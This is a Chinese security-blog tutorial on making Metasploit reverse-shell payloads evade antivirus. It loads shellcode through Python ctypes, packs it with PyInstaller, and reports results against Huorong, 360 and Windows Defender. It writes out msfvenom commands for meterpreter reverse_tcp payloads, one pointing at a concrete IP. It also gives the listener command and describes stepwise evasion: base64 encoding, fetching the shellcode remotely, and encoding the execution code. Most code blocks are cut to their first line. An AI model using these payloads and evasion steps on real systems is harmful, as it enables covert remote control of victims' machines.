# 

原创 walker1995 FreeBuf

 _2021年10月01日 18:05_

## 前言

本文整理自小迪师傅近期课程以及本人实验时所踩的一些坑和思路。文章由浅入深，可以让你从免杀小白到免杀入门者，能够绕过火绒和360等国内主流安全软件，成功上线msf。本人也是刚接触免杀，若有说得不对的地方，欢迎大佬们及时提出指正。关于本人在实验过程中所踩的一些坑会在文中提醒大家，让大家尽量少入坑。

注：以下实验截图均为本人发稿时重新测试所截

## 0X00  基础概念

### 1. python ctypes模块介绍

ctypes是 Python的外部函数库。它提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。具体可参考文末的官方文档

### 2. dll动态链接库

动态链接库是微软公司在微软Windows操作系统中，实现共享函数库概念的一种方式。其后缀名多为.dll, dll文件中包含一个或多个已被编译、链接并与使用它们的进程分开存储的函数。我们经常在程序安装目录下看到它们。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icNfmsyXcQ8WIhtHhHQMAAgNazdzng7tXwsQBcZic4ygKK8y4py6pEmuQ9UKwOaibHafcZaZCb1AGGg/640?wx_fmt=jpeg&wxfrom=13&tp=wxpic)

### 3. pyinstaller

可直接将python语言编写的py程序打包为exe可执行文件，而不需要安装python环境即可直接运行。使用pip安装即可

打包常用命令：

```
pyinstaller -F -w x.py
```

### 4. shellcode

shellcode是一段用于利用软件漏洞而执行的代码，格式为16进制的机器码。因为经常让攻击者获得shell而得名。shellcode常常使用底层语言编写，如c/c++，汇编。

注意：shellcode是16进制格式的，字节流的数据，很底层。所以我们需要了解下它的执行过程，分为四步：（1）申请一片内存；（2）将shellcode放到申请的内存当中；（3）创建线程；（4）执行。了解了这个过程，就好理解后面的代码了

### 5.关于windows defender

Win10系统中自带的防护软件，默认开启，当用户安装了别的防病毒软件时，会自己关闭，需要用户自己手动开启。

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

### 6. 实验环境介绍

本机win10 x64位  安装了火绒安全软件，visual studio2019，pycharm，python3.9.5 x64位

腾讯云服务器：debian10，添加了kali源，安装了msf

测试机器1：虚拟机win10 x64位，不安装任何杀毒软件，使用自带的windows defender

测试机器2：虚拟机win10 x64位，安装了电脑管家，360安全卫士，360杀毒

测试机器3：虚拟机win7 x64位，不能执行win10下用pyinstaller打包的成的exe文件，安装了电脑管家，360安全卫士，360杀毒，测试杀软的静态查杀能力

注：本文中所有杀软均为默认设置，且病毒库升级到最新

## 0x01 开胃小菜

### 1. ctypes模块调用dll动态链接库并调用函数

首先我们来生成一个简单的dll文件，打开visual studio 2019创建一个动态链接库(dll)项目，可以看到预写入一些代码，我们不用管它，直接加入以下代码：

```
#include <stdio.h>
```

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

有点c/c++基础的师傅们，就不难理解这段代码。对于小白，这里还是解释一下：

# 是预处理指令。#include\就是在程序编译之前将头文件stdio.h包含进来，因为我们要用到它里面的printf()打印函数

extern “C”：这里由于文件后缀为.cpp，即c++文件，而ctypes只能调用C函数,c和c++ 编译方式又不太一样，如果在编译时把c的代码用c++方式编译，会产生错误。故在c++引入c的库时要加extern “C”

__declspec(dllexport):用在函数声明前，此前缀是用来实现生成dll文件时可以被导出至dll，即提供调用接口

void TestCtypes():定义一个返回为空，名为TestCtypes的函数，该函数是打印hello world!

接下来，点击生成→生成解决方案即可生成一个.dll文件

那么如何使用python加载dll，并调用里面的函数呢？

很简单,几行代码搞定：

```
from ctypes import *
```

这里CDLL是ctypes模块加载dll的方式，除此之外还有WinDLL,windll.LoadLibrary,cdll.LoadLibrary

最后将刚才生成的DLL文件放到py文件同目录下，运行py文件：

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

注意这里有坑，如果你的python是64位的，生成dll 文件时debug一定要选x64，不然运行py文件调用dll时会报错，32位python就是默认的x86

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

### 2. C编译并执行shellcode

我们先用msf生成一段C的shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=x.x.x.x lport=8080 -f c
```

打开visual studio创建一个空项目Project1，在源文件中新建一个shell.c文件

下面的代码是网上公开的最简单的一段执行shellcode的代码

```
#include <Windows.h>
```

unsigned char buf[]是定义一个无符号字符串数组变量buf，shellcode就是把刚才msf中生成的shellcode带引号和分号拷贝过来

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

我们主要来看下 main函数中相关函数作用和参数

VirtualAlloc()函数的作用是申请一块内存空间

**参数：**

LPVOID VirtualAlloc{

LPVOID lpAddress, // 要分配的内存区域的起始地址

DWORD dwSize, // 分配的大小

DWORD flAllocationType, // 分配的类型

DWORD flProtect // 该内存的初始保护属性

};

MEM_COMMIT | MEM_RESERVE 表示为指定地址空间提交物理内存或保留指定地址空间，不分配物理内存

PAGE_EXECUTE_READWRITE  表示可读写可执行

Memcpy() 内存拷贝函数，函数的功能是从源内存地址的起始位置开始拷贝若干个字节到目标内存地址中

**语法参数：**

**void *memcpy(void *destin, void *source, unsigned n);**

**destin**-- 指向用于存储复制内容的目标数组，类型强制转换为 void* 指针。

**source**-- 指向要复制的数据源，类型强制转换为 void* 指针。

**n**-- 要被复制的字节数。

在刚开始学习的时候一定要注意理解网上已有的公开代码，这样后面会越学越轻松的，另外就算我们对某种语言不了解，看函数名也能大致知道函数的作用了，这就是学习方法。

将代码编写好，最后点击生成→生成解决方案，将其编译为exe文件

注意此处有坑，生成解决方案时请在工具栏中选择release x86，不然会报如下错，win7，win10都一样

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

看下免杀效果：火绒，360，defender直接查杀

电脑管家没报毒（轻松绕过，后面可以直接关闭，无视它了）

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

msf开启监听：

```
use exploit/multi/handler
```

执行exe，测试机器2成功上线，并能执行命令：

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

将生成的exe文件上传到Virustotal.com看下查杀率：30/67

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

### 3. python-ctypes模块加载shellcode

在网上公开的代码中，主要有两种写法

简单点的：

```
#调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
```

复杂点的：

```
#调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
```

本人在实验过程中第二种写法没运行成功过，故本文的实验都是在第一种写法的代码上进行的，来大致解释下各个函数的意义：

windll是载入动态库的方法，kernel32是win32系统的动态库，由此可以知道ctypes 对win32的系统和程序会有较好的支持，对于64位的程序可能并不那么友好（手动捂脸）

VirtualAlloc这个与C中的具有一样的功能，参数也是一样，0x3000就是表示MEM_COMMIT | MEM_RESERVE，0x40就是PAGE_EXECUTE_READWRITE，可读写可执行，这个百度一下C语言的VirtualAlloc函数就知道了

RtlMoveMemory与2中的memcpy函数一样，这里就不过多解释，想深入了解的可以搜下

create_string_buffer() 将shellcode写入内存中，python的byte对象是不可以修改的.如果需要可改变的内存块，需要create_string_buffer()函数

CreateThread()和WaitForSingleObject()

请参考：

https://blog.csdn.net/u012877472/article/details/4972165

## 0x02 免杀对抗

本文只讨论使用python-ctypes模块加载shellcode的免杀思路和效果

在进行免杀对抗前，先来了解下杀软的查杀原理：

一般是匹配特征码，行为监测，虚拟机（沙箱），内存查杀等。360和火绒主要使用特征码检测查杀病毒（云查杀也是特征码检测）。

### 第一回合：Ctypes模块直接加载shellcode执行

Msf中生成payload:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=x.x.x.x lport=8080 -f c
```

注意：我的python是64位的，在我的环境中如果采用windows/meterpreter/reverse_tcp这个payload，最后实验会失败；但在一些x64的python中又是可以的，这里大家多尝试

上代码：

```
import ctypes
```

可以看到这里加载执行shellcode的代码和上面是不太一样的，这是我环境的特殊性（再次捂脸），但在一些x64位的环境中又是没问题的，造成这样的原因是x86和x64的兼容性问题。具体的原因分析请参考文末的参考链接

经过测试，这里将c_uint64改为c_int64,c_void_p都能成功，

运行ms1.py，能成功上线并执行命令

打包：

```
pyinstaller -F -w ms1.py
```

注意：由于我是在windows10上打包的，所以打包后的exe只能在win10上运行,win7运行不了，且在打包过程中有这样的信息：

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

看下免杀效果：

360安全卫士，360杀毒居然没报！惊呆了

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

点击执行，测试机器2成功上线并能执行命令

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

本机火绒没杀，扫描时报毒，扫描界面开启时，点击程序并不能执行，但将扫描界面关闭，再点能成功上线并执行命令。

这教育我们别自己作，如果下载的破解版软件用杀软扫描报毒，别再运行了，除非你想当肉鸡（狗头）

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

windows defender没查杀，运行后上线，但随后连接被断开，且defender自动将程序杀掉，强，动态查杀

### ![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

将ms1.exe文件上传到Virustotal.com看下查杀率：11/67

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

### 第二回合：shellcode进行base64编码，python调用执行

Msf生成shellcode:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=1.14.97.186 lport=8080 --encrypt base64 -f c
```

上代码：

```
import ctypes
```

注意：此处要将msf生成的shellcode去掉引号和分号

运行py成功并上线

pyinstaller打包，看下免杀效果：

测试机器3上扫描没报毒，拖到测试机器2上提示这个，点击允许，360扫描ms2.exe没报毒

有点奇怪，之前实验时没报这个。这里反复试验了几次，给文件改名也会弹出这个，点击允许，再用360扫描没报毒，ms2.exe直接不能拖进去

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

执行程序又能成功上线，很迷，我只能理解为360杀毒是不是不稳定，请大佬赐教。

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

windows defender没查杀，运行后上线，但随后连接被断开，且defender自动将程序杀掉，又是动态查杀，强！

火绒和第一回合结果一样

将ms2.exe文件上传到Virustotal.com看下查杀率：10/67

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

### 第三回合：无文件落地技术

1.写个python脚本将生成的经过编码的shellcode进行去空和去掉换行后，上传到服务器

代码：

```
encode_shellcode='''
```

再写脚本去请求文件，并执行

代码：

```
import ctypes,base64,requests
```

运行成功，打包，看下效果：

360扫描没报毒，执行后能够成功上线并执行命令

火绒和前两个回合一样

Defender动态查杀

Virustotal查杀率：9/66

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

### 第四回合：shellcode编码无文件落地，执行代码编码

上代码：

```
import ctypes
```

注意：这里对执行代码进行base64编码时最好自己写代码或者利用工具，用网上的转码网站可能会实验失败

免杀效果：完美干掉360和火绒（注：这里执行代码不用全部编码也能过火绒，具体参考文末链接）

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

注：在本人前面的实验中，前三个回合火绒都是瞬间查杀的

Defender动态查杀

Virustotal查杀率：9/65

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

### 第五回合：shellcode编码和执行代码编码都无文件落地

代码：

```
import base64
```

Defender提示下面这个，或者是发现威胁，过会就被杀了

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

Virustotal查杀率：10/66

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

微步云沙箱：3/25

### ![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

### 第六回合：终极对抗+实验总结

前面说过虽然所有杀软病毒库为最新，但都是默认设置，后面检查了发现360杀毒和火绒都没啥，主要是360安全卫士，默认是这样的

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

后面两个需要自己点击去下载，人工智能引擎倒没啥，主要是鲲鹏引擎很强大，加了鲲鹏后，全部报毒

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

但如果用户下载的是破解软件，报毒也要安装的话，也会成功上线，如果不执行添加用户这样的敏感操作的话，360也不会提示，在这点上倒是win10自带的defender更强大。

综合本文记录的实验结果和自己前面几次实验来看，我有如下结论：

1.默认设置下，杀毒能力火绒>360安全卫士=360杀毒 >腾讯电脑管家，当360安全卫士添加了鲲鹏引擎后，杀毒能力比其他的都强

2.几款主流杀软都有一个痛点，如果当前网络状态不好，势必会对查杀效果有影响；另外如果用户错误点击了带有免杀的木马，并不会有主动断开连接的操作

3.win10普通用户，如果不是特别需要用到几款主流杀软的一些功能，如：360的软件管家、火绒的火绒剑，用自带的defender足够了

## 0x03 免杀思路拓展

这里先讲几个概念：**生成器，加载器，打包器，加密器，执行器**

本文中我们是用msf生成的C的shellcode，msf就叫生成器

使用python的ctypes模块加载shellcode，ctypes就叫做加载器

用pyingstaller将代码打包成exe，pyinstaller就叫打包器

选用base64编码对代码进行混淆，base64这就加密/编码器

我们是通过ctypes调用并执行C的函数，这就是执行器，网上也有很多shellcode生成器，有其特殊的机制去将代码执行或生成exe

对于生成器的选择，可以有msf，CobaltStrike（CS）等

加载器的选择，可以有ctypes，c/c++，ruby，c#，go语言等

打包器的选择python中就有pyinstaller，py2exe，编译方式不一样，免杀效果也不一样

加密器的选择有base64，hex，异或，AES，RSA

把这些选择排列组合一下是不是就会有很多方式了？

我们还可以将执行shellcode的函数写到dll文件中，然后通过exe去调用

免杀的技术方法还有dll替换，资源文件修改，签名，特征码定位，加壳，改变生成shellcode时的参数，套娃（如：编码之后加密再加密）等等

另外一些小细节可能也会影响免杀效果，比如文件或程序的命名，代码里的注释，从网上拷贝的代码修改变量名，替换下相关函数等

思路是不是一下就开阔了起来。学免杀一定要学原理，只是把网上的一些免杀代码进行编译，或是利用工具生成，这些都没啥用，工具特征码迟早会被检测到，如果工具没更新了，自己是不是就没办法了（迪总语录）。而且别人写的这种工具会不会留有后门。所以还是自己动手，丰衣足食。

本文所讲述的免杀方法很初级，但这些方法，目前绕过国内默认配置的主流杀软是没问题的，就算以后被检测出来了，我们需要做的就是改变下思路，会编写点代码就行了，免杀是如此丰富多彩。

## 0x04 总结

1. 由于ctypes对x64的支持不太好，所以在某些x64的python环境下执行相关代码时会报错，这个说到底是C语言x86和x64的兼容性问题，后续深入学免杀很有可能还会遇到类似问题，最好去了解下x86和x64
    
2. 网上看到的文章，视频一定要自己去动手实践，很有可能因为环境问题，文章中的一些代码和手法在作者的环境中能顺利实现，但在自己的环境中会出错
    
3. 遇到问题先去百度，bing，google等搜索引擎上进行搜索，如果没找到相关问题的解决方法，先去看下官方文档，弄懂原理，然后尝试自己解决
    
4. 后面要深入去学免杀的话，开发能力，底层原理这些是少不了的。
    
    说句题外的话，在计算机相关行业里混，要想成为大佬，数据结构，计算机网络，操作系统，计算机组成原理，数据库这些是永远滴神
    

上述实验可能在不同环境下，查杀率可能又会有点不同，建议各位读者自己多动手实验下，在你的环境下又会遇到什么问题，怎么解决的？查杀率又是多少呢？欢迎评论区留言告诉我哦

### 参考链接：

小迪师傅ctypes免杀原文

python-ctypes官方文档

python使用ctypes库调用DLL动态链接库

Python x64下ctypes动态链接库出现access violation的原因分析

CreateThread和WaitForSingleObject

Python免杀火绒、360和Defender  

### **申明：本文仅供技术交流，请自觉遵守网络安全相关法律法规，请勿利用文章内的相关技术从事非法活动，如因此产生的一切不良后果与文章作者无关。**

